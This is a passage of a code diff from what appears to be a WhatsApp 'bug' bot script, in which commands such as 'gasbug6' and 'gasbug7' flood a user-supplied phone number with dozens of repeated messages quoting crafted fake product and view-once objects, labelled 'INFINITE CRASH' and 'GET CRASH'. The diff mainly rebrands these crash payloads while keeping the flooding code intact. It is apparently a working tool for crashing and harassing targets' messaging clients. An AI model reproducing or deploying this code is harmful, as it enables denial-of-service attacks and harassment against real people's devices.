-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
 await m.reply(`Succes`)
 break
 case 'gasbug6':
@@ -6346,73 +5960,43 @@ message: {
 "productImage":{ 
 "mimetype": "image/jpeg", 
 "jpegThumbnail": fs.readFileSync(`./pict.jpg`)}, 
-"title": "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍", 
-"description": "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍", 
+"title": "© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓", 
+"description": "© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓", 
 "currencyCode": "USD", 
 "priceAmount1000": "5000000000", 
-"retailerId": "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍", 
+"retailerId": "© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓", 
 "productImageCount": 1}, 
 "businessOwnerJid": `6285737134572@s.whatsapp.net`}}}
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko1})
 await m.reply(`Succes`)
 break
 case 'gasbug7':
@@ -6430,68 +6014,37 @@ viewOnce: true
 },
 },
 };
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
